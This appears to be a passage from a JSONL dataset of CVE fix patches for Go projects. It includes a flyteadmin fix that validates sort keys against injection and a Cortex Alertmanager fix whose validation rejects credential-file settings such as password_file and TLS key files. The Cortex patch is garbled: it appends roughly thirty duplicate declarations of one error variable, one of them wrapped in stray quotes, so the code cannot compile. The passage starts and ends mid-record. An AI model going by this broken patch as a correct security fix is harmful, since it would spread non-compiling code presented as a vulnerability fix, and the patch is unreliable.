slice\n-\t\t\ti.Parent.Instances[len(i.Parent.Instances)-1], i.Parent.Instances[idx] = i.Parent.Instances[idx], i.Parent.Instances[len(i.Parent.Instances)-1]\n-\t\t\ti.Parent.Instances = i.Parent.Instances[:len(i.Parent.Instances)-1]\n-\t\t\tbreak\n-\t\t}\n-\t}\n+        // Remove the instance from the Manager's Instances list\n+        for idx, inst := range i.Parent.Instances {\n+                if inst == i {\n+                        // Remove the instance from the slice by swapping it with the last instance and slicing the slice\n+                        i.Parent.Instances[len(i.Parent.Instances)-1], i.Parent.Instances[idx] = i.Parent.Instances[idx], i.Parent.Instances[len(i.Parent.Instances)-1]\n+                        i.Parent.Instances = i.Parent.Instances[:len(i.Parent.Instances)-1]\n+                        break\n+                }\n+        }\n }\n"}
{"cve":"CVE-2023-41891:0708", "fix_patch": "diff --git a/pkg/common/sorting.go b/pkg/common/sorting.go\nindex c4922d0b..780076c6 100644\n--- a/pkg/common/sorting.go\n+++ b/pkg/common/sorting.go\n@@ -1,39 +1,46 @@\n package common\n \n import (\n-\t\"fmt\"\n+\"fmt\"\n+\"regexp\"\n \n-\t\"github.com/flyteorg/flyteadmin/pkg/errors\"\n-\t\"github.com/flyteorg/flyteidl/gen/pb-go/flyteidl/admin\"\n-\t\"google.golang.org/grpc/codes\"\n+\"github.com/flyteorg/flyteadmin/pkg/errors\"\n+\"github.com/flyteorg/flyteidl/gen/pb-go/flyteidl/admin\"\n+\"google.golang.org/grpc/codes\"\n )\n \n const gormDescending = \"%s desc\"\n const gormAscending = \"%s asc\"\n \n+// Ascii letters, numbers, and underscore are supported.\n+var validSortKey = regexp.MustCompile(`^[a-zA-Z0-9_]+$`)\n+\n type SortParameter interface {\n-\tGetGormOrderExpr() string\n+GetGormOrderExpr() string\n }\n \n type sortParamImpl struct {\n-\tgormOrderExpression string\n+gormOrderExpression string\n }\n \n func (s *sortParamImpl) GetGormOrderExpr() string {\n-\treturn s.gormOrderExpression\n+return s.gormOrderExpression\n }\n \n func NewSortParameter(sort admin.Sort) (SortParameter, error) {\n-\tvar gormOrderExpression string\n-\tswitch sort.Direction {\n-\tcase admin.Sort_DESCENDING:\n-\t\tgormOrderExpression = fmt.Sprintf(gormDescending, sort.Key)\n-\tcase admin.Sort_ASCENDING:\n-\t\tgormOrderExpression = fmt.Sprintf(gormAscending, sort.Key)\n-\tdefault:\n-\t\treturn nil, errors.NewFlyteAdminErrorf(codes.InvalidArgument, \"invalid sort order specified: %v\", sort)\n-\t}\n-\treturn &sortParamImpl{\n-\t\tgormOrderExpression: gormOrderExpression,\n-\t}, nil\n+if !validSortKey.MatchString(sort.Key) {\n+return nil, errors.NewFlyteAdminErrorf(codes.InvalidArgument, \"invalid sort key specified: %v\", sort.Key)\n+}\n+var gormOrderExpression string\n+switch sort.Direction {\n+case admin.Sort_DESCENDING:\n+gormOrderExpression = fmt.Sprintf(gormDescending, sort.Key)\n+case admin.Sort_ASCENDING:\n+gormOrderExpression = fmt.Sprintf(gormAscending, sort.Key)\n+default:\n+return nil, errors.NewFlyteAdminErrorf(codes.InvalidArgument, \"invalid sort order specified: %v\", sort)\n+}\n+return &sortParamImpl{\n+gormOrderExpression: gormOrderExpression,\n+}, nil\n }\n"}
{"cve":"CVE-2022-23536:0708", "fix_patch": "diff --git a/pkg/alertmanager/api.go b/pkg/alertmanager/api.go\nindex 3ed63a6e4..35d7cc50b 100644\n--- a/pkg/alertmanager/api.go\n+++ b/pkg/alertmanager/api.go\n@@ -1,451 +1,496 @@\n package alertmanager\n \n import (\n-\t\"context\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"net/http\"\n-\t\"os\"\n-\t\"path/filepath\"\n-\t\"reflect\"\n-\n-\t\"github.com/go-kit/log\"\n-\t\"github.com/go-kit/log/level\"\n-\t\"github.com/pkg/errors\"\n-\t\"github.com/prometheus/alertmanager/config\"\n-\t\"github.com/prometheus/alertmanager/template\"\n-\tcommoncfg \"github.com/prometheus/common/config\"\n-\t\"gopkg.in/yaml.v2\"\n-\n-\t\"github.com/cortexproject/cortex/pkg/alertmanager/alertspb\"\n-\t\"github.com/cortexproject/cortex/pkg/tenant\"\n-\t\"github.com/cortexproject/cortex/pkg/util\"\n-\t\"github.com/cortexproject/cortex/pkg/util/concurrency\"\n-\tutil_log \"github.com/cortexproject/cortex/pkg/util/log\"\n+        \"context\"\n+        \"fmt\"\n+        \"io\"\n+        \"net/http\"\n+        \"os\"\n+        \"path/filepath\"\n+        \"reflect\"\n+\n+        \"github.com/go-kit/log\"\n+        \"github.com/go-kit/log/level\"\n+        \"github.com/pkg/errors\"\n+        \"github.com/prometheus/alertmanager/config\"\n+        \"github.com/prometheus/alertmanager/template\"\n+        commoncfg \"github.com/prometheus/common/config\"\n+        \"gopkg.in/yaml.v2\"\n+\n+        \"github.com/cortexproject/cortex/pkg/alertmanager/alertspb\"\n+        \"github.com/cortexproject/cortex/pkg/tenant\"\n+        \"github.com/cortexproject/cortex/pkg/util\"\n+        \"github.com/cortexproject/cortex/pkg/util/concurrency\"\n+        util_log \"github.com/cortexproject/cortex/pkg/util/log\"\n )\n \n const (\n-\terrMarshallingYAML       = \"error marshalling YAML Alertmanager config\"\n-\terrValidatingConfig      = \"error validating Alertmanager config\"\n-\terrReadingConfiguration  = \"unable to read the Alertmanager config\"\n-\terrStoringConfiguration  = \"unable to store the Alertmanager config\"\n-\terrDeletingConfiguration = \"unable to delete the Alertmanager config\"\n-\terrNoOrgID               = \"unable to determine the OrgID\"\n-\terrListAllUser           = \"unable to list the Alertmanager users\"\n-\terrConfigurationTooBig   = \"Alertmanager configuration is too big, limit: %d bytes\"\n-\terrTooManyTemplates      = \"too many templates in the configuration: %d (limit: %d)\"\n-\terrTemplateTooBig        = \"template %s is too big: %d bytes (limit: %d bytes)\"\n-\n-\tfetchConcurrency = 16\n+        errMarshallingYAML       = \"error marshalling YAML Alertmanager config\"\n+        errValidatingConfig      = \"error validating Alertmanager config\"\n+        errReadingConfiguration  = \"unable to read the Alertmanager config\"\n+        errStoringConfiguration  = \"unable to store the Alertmanager config\"\n+        errDeletingConfiguration = \"unable to delete the Alertmanager config\"\n+        errNoOrgID               = \"unable to determine the OrgID\"\n+        errListAllUser           = \"unable to list the Alertmanager users\"\n+        errConfigurationTooBig   = \"Alertmanager configuration is too big, limit: %d bytes\"\n+        errTooManyTemplates      = \"too many templates in the configuration: %d (limit: %d)\"\n+        errTemplateTooBig        = \"template %s is too big: %d bytes (limit: %d bytes)\"\n+\n+        fetchConcurrency = 16\n )\n \n var (\n-\terrPasswordFileNotAllowed        = errors.New(\"setting password_file, bearer_token_file and credentials_file is not allowed\")\n-\terrOAuth2SecretFileNotAllowed    = errors.New(\"setting OAuth2 client_secret_file is not allowed\")\n-\terrTLSFileNotAllowed             = errors.New(\"setting TLS ca_file, cert_file and key_file is not allowed\")\n-\terrSlackAPIURLFileNotAllowed     = errors.New(\"setting Slack api_url_file and global slack_api_url_file is not allowed\")\n-\terrVictorOpsAPIKeyFileNotAllowed = errors.New(\"setting VictorOps api_key_file is not allowed\")\n+        errPasswordFileNotAllowed        = errors.New(\"setting password_file, bearer_token_file and credentials_file is not allowed\")\n+        errOAuth2SecretFileNotAllowed    = errors.New(\"setting OAuth2 client_secret_file is not allowed\")\n+        errTLSFileNotAllowed             = errors.New(\"setting TLS ca_file, cert_file and key_file is not allowed\")\n+        errSlackAPIURLFileNotAllowed     = errors.New(\"setting Slack api_url_file and global slack_api_url_file is not allowed\")\n+                                errVictorOpsAPIKeyFileNotAllowed = errors.New(\"setting VictorOps api_key_file is not allowed\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+\"errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\"\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+       errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed= errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"setting OpsGenie api_key_file is not allowed\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n )\n \n // UserConfig is used to communicate a users alertmanager configs\n type UserConfig struct {\n-\tTemplateFiles      map[string]string `yaml:\"template_files\"`\n-\tAlertmanagerConfig string            `yaml:\"alertmanager_config\"`\n+        TemplateFiles      map[string]string `yaml:\"template_files\"`\n+        AlertmanagerConfig string            `yaml:\"alertmanager_config\"`\n }\n \n func (am *MultitenantAlertmanager) GetUserConfig(w http.ResponseWriter, r *http.Request) {\n-\tlogger := util_log.WithContext(r.Context(), am.logger)\n-\n-\tuserID, err := tenant.TenantID(r.Context())\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\n-\tcfg, err := am.store.GetAlertConfig(r.Context(), userID)\n-\tif err != nil {\n-\t\tif err == alertspb.ErrNotFound {\n-\t\t\thttp.Error(w, err.Error(), http.StatusNotFound)\n-\t\t} else {\n-\t\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n-\t\t}\n-\t\treturn\n-\t}\n-\n-\td, err := yaml.Marshal(&UserConfig{\n-\t\tTemplateFiles:      alertspb.ParseTemplates(cfg),\n-\t\tAlertmanagerConfig: cfg.RawConfig,\n-\t})\n-\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", errMarshallingYAML, \"err\", err, \"user\", userID)\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errMarshallingYAML, err.Error()), http.StatusInternalServerError)\n-\t\treturn\n-\t}\n-\n-\tw.Header().Set(\"Content-Type\", \"application/yaml\")\n-\tif _, err := w.Write(d); err != nil {\n-\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n-\t\treturn\n-\t}\n+        logger := util_log.WithContext(r.Context(), am.logger)\n+\n+        userID, err := tenant.TenantID(r.Context())\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n+                return\n+        }\n+\n+        cfg, err := am.store.GetAlertConfig(r.Context(), userID)\n+        if err != nil {\n+                if err == alertspb.ErrNotFound {\n+                        http.Error(w, err.Error(), http.StatusNotFound)\n+                } else {\n+                        http.Error(w, err.Error(), http.StatusInternalServerError)\n+                }\n+                return\n+        }\n+\n+        d, err := yaml.Marshal(&UserConfig{\n+                TemplateFiles:      alertspb.ParseTemplates(cfg),\n+                AlertmanagerConfig: cfg.RawConfig,\n+        })\n+\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errMarshallingYAML, \"err\", err, \"user\", userID)\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errMarshallingYAML, err.Error()), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        w.Header().Set(\"Content-Type\", \"application/yaml\")\n+        if _, err := w.Write(d); err != nil {\n+                http.Error(w, err.Error(), http.StatusInternalServerError)\n+                return\n+        }\n }\n \n func (am *MultitenantAlertmanager) SetUserConfig(w http.ResponseWriter, r *http.Request) {\n-\tlogger := util_log.WithContext(r.Context(), am.logger)\n-\tuserID, err := tenant.TenantID(r.Context())\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\n-\tvar input io.Reader\n-\tmaxConfigSize := am.limits.AlertmanagerMaxConfigSize(userID)\n-\tif maxConfigSize > 0 {\n-\t\t// LimitReader will return EOF after reading specified number of bytes. To check if\n-\t\t// we have read too many bytes, allow one extra byte.\n-\t\tinput = io.LimitReader(r.Body, int64(maxConfigSize)+1)\n-\t} else {\n-\t\tinput = r.Body\n-\t}\n-\n-\tpayload, err := io.ReadAll(input)\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", errReadingConfiguration, \"err\", err.Error())\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errReadingConfiguration, err.Error()), http.StatusBadRequest)\n-\t\treturn\n-\t}\n-\n-\tif maxConfigSize > 0 && len(payload) > maxConfigSize {\n-\t\tmsg := fmt.Sprintf(errConfigurationTooBig, maxConfigSize)\n-\t\tlevel.Warn(logger).Log(\"msg\", msg)\n-\t\thttp.Error(w, msg, http.StatusBadRequest)\n-\t\treturn\n-\t}\n-\n-\tcfg := &UserConfig{}\n-\terr = yaml.Unmarshal(payload, cfg)\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", errMarshallingYAML, \"err\", err.Error())\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errMarshallingYAML, err.Error()), http.StatusBadRequest)\n-\t\treturn\n-\t}\n-\n-\tcfgDesc := alertspb.ToProto(cfg.AlertmanagerConfig, cfg.TemplateFiles, userID)\n-\tif err := validateUserConfig(logger, cfgDesc, am.limits, userID); err != nil {\n-\t\tlevel.Warn(logger).Log(\"msg\", errValidatingConfig, \"err\", err.Error())\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errValidatingConfig, err.Error()), http.StatusBadRequest)\n-\t\treturn\n-\t}\n-\n-\terr = am.store.SetAlertConfig(r.Context(), cfgDesc)\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", errStoringConfiguration, \"err\", err.Error())\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errStoringConfiguration, err.Error()), http.StatusInternalServerError)\n-\t\treturn\n-\t}\n-\n-\tw.WriteHeader(http.StatusCreated)\n+        logger := util_log.WithContext(r.Context(), am.logger)\n+        userID, err := tenant.TenantID(r.Context())\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n+                return\n+        }\n+\n+        var input io.Reader\n+        maxConfigSize := am.limits.AlertmanagerMaxConfigSize(userID)\n+        if maxConfigSize > 0 {\n+                // LimitReader will return EOF after reading specified number of bytes. To check if\n+                // we have read too many bytes, allow one extra byte.\n+                input = io.LimitReader(r.Body, int64(maxConfigSize)+1)\n+        } else {\n+                input = r.Body\n+        }\n+\n+        payload, err := io.ReadAll(input)\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errReadingConfiguration, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errReadingConfiguration, err.Error()), http.StatusBadRequest)\n+                return\n+        }\n+\n+        if maxConfigSize > 0 && len(payload) > maxConfigSize {\n+                msg := fmt.Sprintf(errConfigurationTooBig, maxConfigSize)\n+                level.Warn(logger).Log(\"msg\", msg)\n+                http.Error(w, msg, http.StatusBadRequest)\n+                return\n+        }\n+\n+        cfg := &UserConfig{}\n+        err = yaml.Unmarshal(payload, cfg)\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errMarshallingYAML, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errMarshallingYAML, err.Error()), http.StatusBadRequest)\n+                return\n+        }\n+\n+        cfgDesc := alertspb.ToProto(cfg.AlertmanagerConfig, cfg.TemplateFiles, userID)\n+        if err := validateUserConfig(logger, cfgDesc, am.limits, userID); err != nil {\n+                level.Warn(logger).Log(\"msg\", errValidatingConfig, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errValidatingConfig, err.Error()), http.StatusBadRequest)\n+                return\n+        }\n+\n+        err = am.store.SetAlertConfig(r.Context(), cfgDesc)\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errStoringConfiguration, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errStoringConfiguration, err.Error()), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        w.WriteHeader(http.StatusCreated)\n }\n \n // DeleteUserConfig is exposed via user-visible API (if enabled, uses DELETE method), but also as an internal endpoint using POST method.\n // Note that if no config exists for a user, StatusOK is returned.\n func (am *MultitenantAlertmanager) DeleteUserConfig(w http.ResponseWriter, r *http.Request) {\n-\tlogger := util_log.WithContext(r.Context(), am.logger)\n-\tuserID, err := tenant.TenantID(r.Context())\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\n-\terr = am.store.DeleteAlertConfig(r.Context(), userID)\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", errDeletingConfiguration, \"err\", err.Error())\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errDeletingConfiguration, err.Error()), http.StatusInternalServerError)\n-\t\treturn\n-\t}\n-\n-\tw.WriteHeader(http.StatusOK)\n+        logger := util_log.WithContext(r.Context(), am.logger)\n+        userID, err := tenant.TenantID(r.Context())\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n+                return\n+        }\n+\n+        err = am.store.DeleteAlertConfig(r.Context(), userID)\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errDeletingConfiguration, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errDeletingConfiguration, err.Error()), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        w.WriteHeader(http.StatusOK)\n }\n \n // Partially copied from: https://github.com/prometheus/alertmanager/blob/8e861c646bf67599a1704fc843c6a94d519ce312/cli/check_config.go#L65-L96\n func validateUserConfig(logger log.Logger, cfg alertspb.AlertConfigDesc, limits Limits, user string) error {\n-\t// We don't have a valid use case for empty configurations. If a tenant does not have a\n-\t// configuration set and issue a request to the Alertmanager, we'll a) upload an empty\n-\t// config and b) immediately start an Alertmanager instance for them if a fallback\n-\t// configuration is provisioned.\n-\tif cfg.RawConfig == \"\" {\n-\t\treturn fmt.Errorf(\"configuration provided is empty, if you'd like to remove your configuration please use the delete configuration endpoint\")\n-\t}\n-\n-\tamCfg, err := config.Load(cfg.RawConfig)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Validate the config recursively scanning it.\n-\tif err := validateAlertmanagerConfig(amCfg); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Validate templates referenced in the alertmanager config.\n-\tfor _, name := range amCfg.Templates {\n-\t\tif err := validateTemplateFilename(name); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\t// Check template limits.\n-\tif l := limits.AlertmanagerMaxTemplatesCount(user); l > 0 && len(cfg.Templates) > l {\n-\t\treturn fmt.Errorf(errTooManyTemplates, len(cfg.Templates), l)\n-\t}\n-\n-\tif maxSize := limits.AlertmanagerMaxTemplateSize(user); maxSize > 0 {\n-\t\tfor _, tmpl := range cfg.Templates {\n-\t\t\tif size := len(tmpl.GetBody()); size > maxSize {\n-\t\t\t\treturn fmt.Errorf(errTemplateTooBig, tmpl.GetFilename(), size, maxSize)\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// Validate template files.\n-\tfor _, tmpl := range cfg.Templates {\n-\t\tif err := validateTemplateFilename(tmpl.Filename); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\t// Create templates on disk in a temporary directory.\n-\t// Note: This means the validation will succeed if we can write to tmp but\n-\t// not to configured data dir, and on the flipside, it'll fail if we can't write\n-\t// to tmpDir. Ignoring both cases for now as they're ultra rare but will revisit if\n-\t// we see this in the wild.\n-\tuserTempDir, err := os.MkdirTemp(\"\", \"validate-config-\"+cfg.User)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer os.RemoveAll(userTempDir)\n-\n-\tfor _, tmpl := range cfg.Templates {\n-\t\ttemplateFilepath, err := safeTemplateFilepath(userTempDir, tmpl.Filename)\n-\t\tif err != nil {\n-\t\t\tlevel.Error(logger).Log(\"msg\", \"unable to create template file path\", \"err\", err, \"user\", cfg.User)\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tif _, err = storeTemplateFile(templateFilepath, tmpl.Body); err != nil {\n-\t\t\tlevel.Error(logger).Log(\"msg\", \"unable to store template file\", \"err\", err, \"user\", cfg.User)\n-\t\t\treturn fmt.Errorf(\"unable to store template file '%s'\", tmpl.Filename)\n-\t\t}\n-\t}\n-\n-\ttemplateFiles := make([]string, len(amCfg.Templates))\n-\tfor i, t := range amCfg.Templates {\n-\t\ttemplateFiles[i] = filepath.Join(userTempDir, t)\n-\t}\n-\n-\t_, err = template.FromGlobs(templateFiles...)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Note: Not validating the MultitenantAlertmanager.transformConfig function as that\n-\t// that function shouldn't break configuration. Only way it can fail is if the base\n-\t// autoWebhookURL itself is broken. In that case, I would argue, we should accept the config\n-\t// not reject it.\n-\n-\treturn nil\n+        // We don't have a valid use case for empty configurations. If a tenant does not have a\n+        // configuration set and issue a request to the Alertmanager, we'll a) upload an empty\n+        // config and b) immediately start an Alertmanager instance for them if a fallback\n+        // configuration is provisioned.\n+        if cfg.RawConfig == \"\" {\n+                return fmt.Errorf(\"configuration provided is empty, if you'd like to remove your configuration please use the delete configuration endpoint\")\n+        }\n+\n+        amCfg, err := config.Load(cfg.RawConfig)\n+        if err != nil {\n+                return err\n+        }\n+\n+        // Validate the config recursively scanning it.\n+        if err := validateAlertmanagerConfig(amCfg); err != nil {\n+                return err\n+        }\n+\n+        // Validate templates referenced in the alertmanager config.\n+        for _, name := range amCfg.Templates {\n+                if err := validateTemplateFilename(name); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        // Check template limits.\n+        if l := limits.AlertmanagerMaxTemplatesCount(user); l > 0 && len(cfg.Templates) > l {\n+                return fmt.Errorf(errTooManyTemplates, len(cfg.Templates), l)\n+        }\n+\n+        if maxSize := limits.AlertmanagerMaxTemplateSize(user); maxSize > 0 {\n+                for _, tmpl := range cfg.Templates {\n+                        if size := len(tmpl.GetBody()); size > maxSize {\n+                                return fmt.Errorf(errTemplateTooBig, tmpl.GetFilename(), size, maxSize)\n+                        }\n+                }\n+        }\n+\n+        // Validate template files.\n+        for _, tmpl := range cfg.Templates {\n+                if err := validateTemplateFilename(tmpl.Filename); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        // Create templates on disk in a temporary directory.\n+        // Note: This means the validation will succeed if we can write to tmp but\n+        // not to configured data dir, and on the flipside, it'll fail if we can't write\n+        // to tmpDir. Ignoring both cases for now as they're ultra rare but will revisit if\n+        // we see this in the wild.\n+        userTempDir, err := os.MkdirTemp(\"\", \"validate-config-\"+cfg.User)\n+        if err != nil {\n+                return err\n+        }\n+        defer os.RemoveAll(userTempDir)\n+\n+        for _, tmpl := range cfg.Templates {\n+                templateFilepath, err := safeTemplateFilepath(userTempDir, tmpl.Filename)\n+                if err != nil {\n+                        level.Error(logger).Log(\"msg\", \"unable to create template file path\", \"err\", err, \"user\", cfg.User)\n+                        return err\n+                }\n+\n+                if _, err = storeTemplateFile(templateFilepath, tmpl.Body); err != nil {\n+                        level.Error(logger).Log(\"msg\", \"unable to store template file\", \"err\", err, \"user\", cfg.User)\n+                        return fmt.Errorf(\"unable to store template file '%s'\", tmpl.Filename)\n+                }\n+        }\n+\n+        templateFiles := make([]string, len(amCfg.Templates))\n+        for i, t := range amCfg.Templates {\n+                templateFiles[i] = filepath.Join(userTempDir, t)\n+        }\n+\n+        _, err = template.FromGlobs(templateFiles...)\n+        if err != nil {\n+                return err\n+        }\n+\n+        // Note: Not validating the MultitenantAlertmanager.transformConfig function as that\n+        // that function shouldn't break configuration. Only way it can fail is if the base\n+        // autoWebhookURL itself is broken. In that case, I would argue, we should accept the config\n+        // not reject it.\n+\n+        return nil\n }\n \n func (am *MultitenantAlertmanager) ListAllConfigs(w http.ResponseWriter, r *http.Request) {\n-\tlogger := util_log.WithContext(r.Context(), am.logger)\n-\tuserIDs, err := am.store.ListAllUsers(r.Context())\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", \"failed to list users of alertmanager\", \"err\", err)\n-\t\thttp.Error(w, fmt.Sprintf(\"%s: %s\", errListAllUser, err.Error()), http.StatusInternalServerError)\n-\t\treturn\n-\t}\n-\n-\tdone := make(chan struct{})\n-\titer := make(chan interface{})\n-\n-\tgo func() {\n-\t\tutil.StreamWriteYAMLResponse(w, iter, logger)\n-\t\tclose(done)\n-\t}()\n-\n-\terr = concurrency.ForEachUser(r.Context(), userIDs, fetchConcurrency, func(ctx context.Context, userID string) error {\n-\t\tcfg, err := am.store.GetAlertConfig(ctx, userID)\n-\t\tif errors.Is(err, alertspb.ErrNotFound) {\n-\t\t\treturn nil\n-\t\t} else if err != nil {\n-\t\t\treturn errors.Wrapf(err, \"failed to fetch alertmanager config for user %s\", userID)\n-\t\t}\n-\t\tdata := map[string]*UserConfig{\n-\t\t\tuserID: {\n-\t\t\t\tTemplateFiles:      alertspb.ParseTemplates(cfg),\n-\t\t\t\tAlertmanagerConfig: cfg.RawConfig,\n-\t\t\t},\n-\t\t}\n-\n-\t\tselect {\n-\t\tcase iter <- data:\n-\t\tcase <-done: // stop early, if sending response has already finished\n-\t\t}\n-\n-\t\treturn nil\n-\t})\n-\tif err != nil {\n-\t\tlevel.Error(logger).Log(\"msg\", \"failed to list all alertmanager configs\", \"err\", err)\n-\t}\n-\tclose(iter)\n-\t<-done\n+        logger := util_log.WithContext(r.Context(), am.logger)\n+        userIDs, err := am.store.ListAllUsers(r.Context())\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", \"failed to list users of alertmanager\", \"err\", err)\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errListAllUser, err.Error()), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        done := make(chan struct{})\n+        iter := make(chan interface{})\n+\n+        go func() {\n+                util.StreamWriteYAMLResponse(w, iter, logger)\n+                close(done)\n+        }()\n+\n+        err = concurrency.ForEachUser(r.Context(), userIDs, fetchConcurrency, func(ctx context.Context, userID string) error {\n+                cfg, err := am.store.GetAlertConfig(ctx, userID)\n+                if errors.Is(err, 